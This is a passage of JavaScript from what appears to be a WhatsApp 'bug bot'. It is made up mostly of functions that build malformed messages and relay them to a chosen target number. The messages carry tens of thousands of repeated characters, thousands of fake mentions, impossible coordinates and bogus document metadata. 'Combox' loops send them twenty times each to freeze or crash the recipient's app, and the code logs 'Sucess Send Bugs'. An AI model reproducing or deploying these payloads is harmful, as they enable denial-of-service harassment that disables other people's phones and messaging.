                  text: "⭑̤▾ ⿻ ⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇳🇬🇳🇬⿻ ⿻ ▾⭑̤" + "ꦾ".repeat(70000),
                },
                nativeFlowMessage: {
                  messageParamsJson:
                    '{"name":"galaxy_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
                  buttons: [
                    cct
                      ? {
                          name: "single_select",
                          buttonParamsJson:
                            '{"title":"\n⿻ ⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇳🇬🇳🇬⿻ ⿻\n\n' +
                            "᬴".repeat(0) +
                            '","sections":[{"title":"⿻ ⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇳🇬🇳🇬⿻ ⿻","rows":[]}]}',
                        }
                      : {
                          name: "payment_method",
                          buttonParamsJson: "",
                        },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "payment_method",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "single_select",
                      buttonParamsJson:
                        '{"title":"⿻ ⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇳🇬🇳🇬⿻ ⿻","sections":[{"title":"⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇳🇬🇳🇬⿻ 𝐈𝐒 𝐇𝐄𝐑𝐄 ϟ","rows":[]}]}',
                    },
                    {
                      name: "galaxy_message",
                      buttonParamsJson:
                        '{"flow_action":"navigate","flow_action_payload":{"screen":"WELCOME_SCREEN"},"flow_cta":"🔥","flow_id":"BY DEVORSIXCORE","flow_message_version":"9","flow_token":"MYPENISMYPENISMYPENIS"}',
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "{}",
                    },
                  ],
                },
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: Qtd,
        }
      );

      await Dare.relayMessage(
        X,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("Sucess Send Bugs BY⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑 ⿻ ▾⭑"));
    }

    async function InVisiXz(X, ThM, cct = false, ptcp = false) {
      let etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 9007199254740991,
                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                    fileName: "🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
                    fileEncSha256:
                      "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                    directPath:
                      "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1723855952",
                    contactVcard: true,
                    thumbnailDirectPath:
                      "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256:
                      "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256:
                      "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⭑̤▾ ⿻ ⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇳🇬🇳🇬⿻ ⿻ ▾⭑̤",
                },
                nativeFlowMessage: {
                  messageParamsJson:
                    '{"name":"galaxy_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
                  buttons: [
                    cct
                      ? {
                          name: "single_select",
                          buttonParamsJson:
                            '{"title":"Sucess Send Bugs BY⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5' +
                            "᬴".repeat(0) +
                            '","sections":[{"title":"⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇳🇬🇳🇬⿻ 𝐈𝐒 𝐇𝐄𝐑𝐄 ϟ","rows":[]}]}',
                        }
                      : {
                          name: "payment_method",
                          buttonParamsJson: "",
                        },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "payment_method",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "single_select",
                      buttonParamsJson:
                        '{"title":"Sucess Send Bugs BY⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑","sections":[{"title":"𝐀𝐒𝐓𝐑𝐀𝐋 𝐈𝐒 𝐇𝐄𝐑𝐄 ϟ","rows":[]}]}',
                    },
                    {
                      name: "galaxy_message",
                      buttonParamsJson:
                        '{"flow_action":"navigate","flow_action_payload":{"screen":"WELCOME_SCREEN"},"flow_cta":"🔥","flow_id":"BY DEVORSIXCORE","flow_message_version":"9","flow_token":"MYPENISMYPENISMYPENIS"}',
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "{}",
                    },
                  ],
                },
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: VisiX,
        }
      );

      await Dare.relayMessage(
        X,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("Sucess Send Bugs BY⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑 ⿻ ▾⭑"));
    }

async function InVisiLoc(X, ThM, ptcp = false) {
      let etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "⭑̤▾ ⿻ Sucess Send Bugs BY⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑 ⿻ ▾⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
                  locationMessage: {
                    degreesLatitude: -999.03499999999999,
                    degreesLongitude: 922.999999999999,
                    name: "⚝Sucess Send Bugs BY⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑⚝",
                    address: "Sucess Send Bugs BY⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑",
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "",
                },
                nativeFlowMessage: {
                  messageParamsJson: " 𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️ ",
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: {
                        title: "Sucess Send Bugs BY⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑",
                        sections: [
                          {
                            title: "⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇳🇬🇳🇬⿻ 𝐈𝐒 𝐇𝐄𝐑𝐄 ϟ",
                            rows: [],
                          },
                        ],
                      },
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: {},
                    },
                  ],
                },
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: EsQl,
        }
      );
      await Dare.relayMessage(
        X,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By ⭑̤▾ ⿻ ⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑 ⿻ ▾⭑"));
    }

/*BARA FUNCTION*/

async function OLDLOC(target, QBug) {
var atc = await generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
    message: {
      interactiveMessage: {
        header: {
          title: "⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑 𝗡𝗢 𝗖𝗢𝗨𝗡𝗧𝗘𝗥\n",
          locationMessage: {
            degreesLatitude: -999.03499999999999,
            degreesLongitude: 999.03499999999999,
            jpegThumbnail: global.thumb
          },
          hasMediaAttachment: true
        },
        body: {
          text: "ꦾ".repeat(20) + "@1".repeat(50000)
        },
        nativeFlowMessage: {
          messageParamsJson: " ꦾ".repeat(55000)
        },
        carouselMessage: {}
      }
    }
  }
}), { userJid: target, quoted: QBug })
await Dare.relayMessage(target, atc.message, { participant: { jid: target }, messageId: atc.key.id })
};

async function BugFrezee(target) {
            Dare.relayMessage(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/pdf",
                                fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                                fileLength: "1991837291999",
                                pageCount: 199183729199991,
                                mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                                fileName: "DeepDocumentDpr",
                                fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                                directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1728631701",
                                contactVcard: true,
                                caption: " ꦾ".repeat(20) + "@1".repeat(50000),
                                contextInfo: {
                                    mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                    groupMentions: [{ groupJid: "1@newsletter", groupSubject: "⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑🤓" }],
                                    isForwarded: true,
                                    quotedMessage: {
                                        interactiveResponseMessage: {
                                            body: {
                                                text: "Sent",
                                                format: "DEFAULT"
                                            },
                                            nativeFlowResponseMessage: {
                                                name: "galaxy_message",
                                                paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "😂⃟⃟⃟⃟⃚ ͢𝄽𝗫𝘃𝗢 𝗢𝘂𝘁𝄽⃟⃟⃟🇮🇩",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "Barainfinity@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        }`,
                                                version: 3
                                            },
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                { participant: { jid: target } }
            );            
        };
        async function EncryptMessage(target) {
    const locationMessageContent = proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        locationMessage: {
            degreesLatitude: -999.03499999999999,
            degreesLongitude: 999.03499999999999,
            name: "ꦾ".repeat(50000),
            url: "@1".repeat(30),
            mentionedJid: [
								"1@s.whatsapp.net",
								...Array.from({
									length: 15000
								}, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
							],
            jpegThumbnail: global.thumb
        }
      }
    }
    });

    const encryptedMessage = generateWAMessageFromContent(target, locationMessageContent, { userJid: target });

    await Dare.relayMessage(target, encryptedMessage.message, { participant: { jid: target } });
};

        async function DocSystem(target) {
            let virtex = "😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑 𝗖𝗥𝗔𝗦𝗛𝄽⃟⃟⃟🇮🇩";

            Dare.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑 𝗡𝗢 𝗖𝗢𝗨𝗡𝗧𝗘𝗥𝄽⃟⃟⃟🇮🇩" + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "SkyzoXSENTRY" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
        async function DocSystem2(target) {
            Dare.relayMessage(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/pdf",
                                fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                                fileLength: "1991837291999",
                                pageCount: 199183729199991,
                                mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                                fileName: "DeepDocumentDpr",
                                fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                                directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1728631701",
                                contactVcard: true,
                                caption: " ꦾ".repeat(20) + "@1".repeat(50000),
                                contextInfo: {
                                    mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                    groupMentions: [{ groupJid: "1@newsletter", groupSubject: "bad ⚔️" }],
                                    isForwarded: true,
                                    quotedMessage: {
                                        interactiveResponseMessage: {
                                            body: {
                                                text: "Sent",
                                                format: "DEFAULT"
                                            },
                                            nativeFlowResponseMessage: {
                                                name: "galaxy_message",
                                                paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "AVILIABLEBYBara",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "bad@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        }`,
                                                version: 3
                                            },
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                { participant: { jid: target } }
            );
        };
        async function DocSystem3(target) {
            Dare.relayMessage(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: "XHIROXD",
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                title: "Tra͢sᯭh͢ Ui-Aviliable",
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "TypeTrashUi-Killer"
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: 'call_permission_request',
                                        buttonParamsJson: '{}'
                                    }
                                ]
                            },
                            contextInfo: {
                                quotedMessage: {
                                    interactiveResponseMessage: {
                                        body: {
                                            text: "Sent",
                                            format: "DEFAULT"
                                        },
                                        nativeFlowResponseMessage: {
                                            name: "galaxy_message",
                                            paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "BaraXS",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "bad@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                }`,
                                            version: 3
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }, { participant: { jid: target } }, { messageId: null });
};
            async function FrezeeMsg2(target) {
            let virtex = "⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑 𝗡𝗢 𝗖𝗢𝗨𝗡𝗧𝗘𝗥𝄽⃟⃟⃟🇮🇩⿻";
            let memekz = Date.now();

            await Dare.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "😂⃟⃟⃟⃟⃚ ͢𝄽⿻  𝐃𝐀𝐑𝐄-𝐕𝟑𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇮🇩" + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "SkyziEXECUTE" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
        
async function yoiAi(query) {
  return new Promise(async (resolve, reject) => {
    axios.get('https://api.yanzbotz.live/api/ai/labs-perplexity', {
      params: {
        query: query,
        model: 'llama-3.1-sonar-large-128k-online'
      }
    })
    .then(response => {
      resolve(response.data);
    })
    .catch(error => {
      reject(error);
    });
  });
};
        

async function FrezeeMsg1(target) {
            let virtex = "⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇳🇬🇳🇬⿻";

            Dare.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇳🇬🇳🇬⿻" + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "BaraEXECUTE" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        }
        
async function Combox(target) {
for (let i = 0; i < 20; i++) {
await DocSystem(target, Null)
await DocSystem2(target, Null)
await DocSystem3(target, Null)
await BugFrezee(target, Null)
await EncryptMessage(target, Null)
await FrezeeMsg1(target, Null)
await FrezeeMsg2(target, Null)
}
console.log(chalk.red.bold(`𝗦𝗘𝗡𝗗𝗘𝗥 𝗖𝗢𝗠𝗕𝗢𝗫 𝗧𝗢 ${target}`))
}

async function Combox2(target) {
for (let i = 0; i < 20; i++) {
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
}
console.log(chalk.red.bold(`𝗦𝗘𝗡𝗗𝗘𝗥 𝗖𝗢𝗠𝗕𝗢𝗫 𝗧𝗢 ${target}`))
}

async function Combox3(target) {
for (let i = 0; i < 20; i++) {
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await DocSystem(target)
await DocSystem2(target)
await DocSystem3(target)
await BugFrezee(target)
await EncryptMessage(target)
await FrezeeMsg1(target)
await FrezeeMsg2(target)
}
console.log(chalk.red.bold(`𝗦𝗘𝗡𝗗𝗘𝗥 𝗖𝗢𝗠𝗕𝗢𝗫 𝗧𝗢 ${target}`))
}
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

async function sendQP(X, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
    var qpMessage = generateWAMessageFromContent(X, proto.Message.fromObject({
        'qp': {
            'filter': {
                'filterName': filterName,
                'parameters': parameters,
                'filterResult': filterResult,
                'clientNotSupportedConfig': clientNotSupportedConfig
            },
            'filterClause': {
                'clauseType': clauseType,
                'clauses': clauses,
                'filters': filters
            }
        }
    }), { userJid: X });

    await Dare.relayMessage(X, qpMessage.message, { participant: { jid: X }, messageId: qpMessage.key.id });
}
		    
		async function sendSessionStructure(X, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
    var sessionStructure = generateWAMessageFromContent(X, proto.Message.fromObject({
        'sessionStructure': {
            'sessionVersion': sessionVersion,
            'localIdentityPublic': localIdentityPublic,
            'remoteIdentityPublic': remoteIdentityPublic,
            'rootKey': rootKey,
            'previousCounter': previousCounter,
            'senderChain': senderChain,
            'receiverChains': receiverChains,
            'pendingKeyExchange': pendingKeyExchange,
            'pendingPreKey': pendingPreKey,
            'remoteRegistrationId': remoteRegistrationId,
            'localRegistrationId': localRegistrationId,
            'needsRefresh': needsRefresh,
            'aliceBaseKey': aliceBaseKey
        }
    }), { userJid: X });

    await Dare.relayMessage(X, sessionStructure.message, { participant: { jid: X }, messageId: sessionStructure.key.id });
}


		const Porke = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./data/thumb.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍👑🤴 𝐊𝐈𝐍𝐆 𝐁𝐀𝐃𝐁𝐎𝐈𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

		const Porke2 = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./data/thumb.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
